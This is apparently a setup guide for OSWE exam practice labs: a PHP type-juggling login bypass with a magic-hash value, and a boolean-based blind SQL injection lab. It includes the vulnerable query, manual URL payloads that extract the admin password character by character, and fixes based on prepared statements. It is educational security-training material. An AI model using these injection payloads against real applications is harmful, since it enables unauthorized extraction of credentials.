# OSWE_LAB_PREP
OSWE CUSTOM LABS AND PREPARATION MASTER GUIDE
# Topic:php type juggling custom lab for OSWE
# 🐧 LAMPP (Linux)

1. **Start LAMPP**

   ```bash
   sudo /opt/lampp/lampp start
   ```
# 🐧 LAMPP GUI Method

## **Start with GUI:**
```bash
cd /opt/lampp
sudo ./manager-linux-x64.run
```

## **What it does:**
- Opens visual control panel
- Shows service status (Apache, MySQL)
- Click buttons to start/stop services

## **After starting:**
- Website: `http://localhost`
- phpMyAdmin: `http://localhost/phpmyadmin`
- Files go in: `/opt/lampp/htdocs/`

## **To stop:**
- Click "Stop" in GUI
- Or terminal: `sudo /opt/lampp/lampp stop`

**Easier than command line, same result.**

2. **Copy PHP Files**

   * Place your `.php` files into the LAMPP web directory:

     ```bash
     cd OSWE_LAB_PREP/php_type_juggling/lab
     sudo cp -r . /opt/lampp/htdocs/.
     ```
   * Access them at:
     👉 `http://localhost/vulnerable_login.php`

3. **Import Database via phpMyAdmin**

   * Open: 👉 [http://localhost/phpmyadmin/](http://localhost/phpmyadmin/)
   * Click **Databases** → Create new DB .
   * Select  **Import** tab.
   * Browse and upload `database.sql`.
   * Click **Go** → schema + data imported.

4. **Update PHP Config**
   Inside your PHP connection file (e.g., `config.php`):

```php
   // Database configuration
  define('DB_HOST', 'localhost');
  define('DB_USER', 'root');
  define('DB_PASS', '');
  define('DB_NAME', 'type_juggling_lab');
```

go to the folder where there is php.py and run python3 php.py http://localhost/vulnerable_login.php change the payload in return to the magic hash password you want 
```bash

def php_magic_hashes():
	print("[+] Returning php magic hashes whose md5 evaluate to 0")
	return "aabg7XSs"
```
# 📝 SQL Injection Lab Setup Guide for OSWE

## 🎯 Topic: Blind SQL Injection (Boolean-Based) Lab

## 🐧 XAMPP/LAMPP Setup

### 1. **Start XAMPP/LAMPP Server**
```bash
sudo /opt/lampp/lampp start
```
# 🐧 LAMPP GUI Method

## **Start with GUI:**
```bash
cd /opt/lampp
sudo ./manager-linux-x64.run
```

## **What it does:**
- Opens visual control panel
- Shows service status (Apache, MySQL)
- Click buttons to start/stop services

## **After starting:**
- Website: `http://localhost`
- phpMyAdmin: `http://localhost/phpmyadmin`
- Files go in: `/opt/lampp/htdocs/`

## **To stop:**
- Click "Stop" in GUI
- Or terminal: `sudo /opt/lampp/lampp stop`

**Easier than command line, same result.**

### 2. **Import Database**
#### **Method A: Using phpMyAdmin**
1. Open phpMyAdmin: 👉 [http://localhost/phpmyadmin/](http://localhost/phpmyadmin/)
2. Click **Databases** → Create new database named `oswe_lab`
3. Select the new database, go to **Import** tab
4. Browse and upload `setup.sql`
5. Click **Go** to execute

### 3. **Deploy Web Application**
```bash
# Copy PHP files to web directory
cp config.php index.php /opt/lampp/htdocs/
```

**Access the vulnerable application:** 👉 `http://localhost/index.php`

## 🗂️ File Structure
```
sql-injection-lab/
├── setup.sql           # Database schema and data
├── config.php          # Database configuration
├── index.php           # Vulnerable web application
└── sqli.py             # Exploitation script
```

## 📊 Database Details

### **Tables Created:**
1. **`products`** (Visible table)
   - id, name, description, price
   - Contains: OSWE Course Guide, Debugging Tool, etc.

2. **`users`** (Hidden target table)
   - id, username, password, is_admin
   - Contains: admin user with flag as password

### **Database Credentials:**
```php
Username: oswe_user
Password: oswe_password
Database: oswe_lab
```

## 🎯 Vulnerability Analysis

### **Location:**
```php
// In index.php line ~20:
$sql = "SELECT name, description, price FROM products WHERE id = ". $id. " LIMIT 1";
```

### **Type:**
- **Boolean-Based Blind SQL Injection**
- No direct output of query results
- Uses presence/absence of "OSWE Course Guide" as boolean oracle

## 🔧 Exploitation Script

### **`sqli.py` - Automated Exploitation**
This script automates the extraction of the admin password using blind SQL injection.

### **Usage:**
```bash
cd ~/OSWE/sqli
python3 sqli.py http://localhost/index.php
```

### **What the Script Does:**
1. **Determines password length** by testing LENGTH() conditions
2. **Extracts password character by character** using SUBSTRING() and ASCII() comparisons
3. **Uses "OSWE Course Guide"** in response as a boolean indicator
4. **Reconstructs the flag** from extracted characters

### **Character Set:**
```python
charset = string.ascii_letters + string.digits + "{}_-@!?"
# Covers typical flag formats like: OSWE{Blind_SQLi_XAMPP_Mastery_2025}
```

## 🚀 Running the Exploit

### **Step-by-Step Execution:**
```bash
# Navigate to script directory
cd ~/OSWE/sqli

# Run the exploit
python3 sqli.py http://localhost/index.php
```

### **Expected Output:**
```
[+] http://localhost/index.php is our target
[+] Length of the password is 34
OSWE{Blind_SQLi_XAMPP_Mastery_2025}
[+] Password is OSWE{Blind_SQLi_XAMPP_Mastery_2025}
[!] Done :)
```

## 🔍 Manual Testing Payloads

### **1. Test for Vulnerability:**
```
http://localhost/index.php?id=1 AND 1=1  -- Shows product
http://localhost/index.php?id=1 AND 1=2  -- No product (page shows error)
```

### **2. Determine Password Length:**
```
http://localhost/index.php?id=1 AND LENGTH((SELECT password FROM users WHERE username='admin'))=34
```

### **3. Extract First Character:**
```
http://localhost/index.php?id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=79
# 79 = 'O' in ASCII
```

### **4. Extract Entire Password (Manual):**
```
http://localhost/index.php?id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=79 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),2,1))=83 AND ...
```

## 🧠 Understanding the Exploit

### **Boolean-Based Logic:**
- **TRUE Condition:** Product with ID=1 exists → Shows "OSWE Course Guide"
- **FALSE Condition:** No product returned → Shows "Product not found"

### **Payload Breakdown:**
```sql
1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=79
```
- `1` - Valid product ID that exists
- `AND` - Logical operator to add our condition
- `ASCII(SUBSTRING(...))` - Gets ASCII value of character at position
- `=79` - Compares to ASCII value of 'O'

### **The Flag:**
The admin password is the flag: **`OSWE{Blind_SQLi_XAMPP_Mastery_2025}`**

## 🛡️ Defense Mechanisms

### **How to Fix the Vulnerability:**

1. **Use Prepared Statements:**
```php
$stmt = $conn->prepare("SELECT name, description, price FROM products WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

2. **Input Validation:**
```php
if (!is_numeric($id) || $id <= 0) {
    die("Invalid product ID");
}
```

3. **Use Parameterized Queries:**
```php
$sql = "SELECT name, description, price FROM products WHERE id = :id";
$stmt = $pdo->prepare($sql);
$stmt->execute(['id' => $id]);
```

4. **Least Privilege Principle:**
   - Already implemented: Using `oswe_user` with limited privileges
   - Avoid using root database accounts

## 📚 Learning Objectives

✅ Understand Boolean-based blind SQL injection  
✅ Learn to exploit SQLi without direct output  
✅ Practice writing automated exploitation scripts  
✅ Understand database enumeration techniques  
✅ Learn about MySQL SUBSTRING() and ASCII() functions  
✅ Practice character-by-character data extraction  

## 🐛 Troubleshooting

### **Common Issues:**
1. **Database connection fails:**
   - Check if MySQL is running: `sudo /opt/lampp/lampp status`
   - Verify credentials in `config.php`

2. **Exploit script doesn't find length:**
   - Check if "OSWE Course Guide" exists in response
   - Test manually with payloads first

3. **Character set incomplete:**
   - Modify charset in script if flag contains special characters

## 📖 Additional Resources

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Academy](https://portswigger.net/web-security/sql-injection)
- [MySQL String Functions Documentation](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html)

## ⚠️ Legal & Ethical Notice

This lab is for **educational purposes only**. Use only in controlled environments with proper authorization. Never test on systems you don't own or have explicit permission to test.

---

**Happy hacking and learning SQL Injection! 🔍💻**
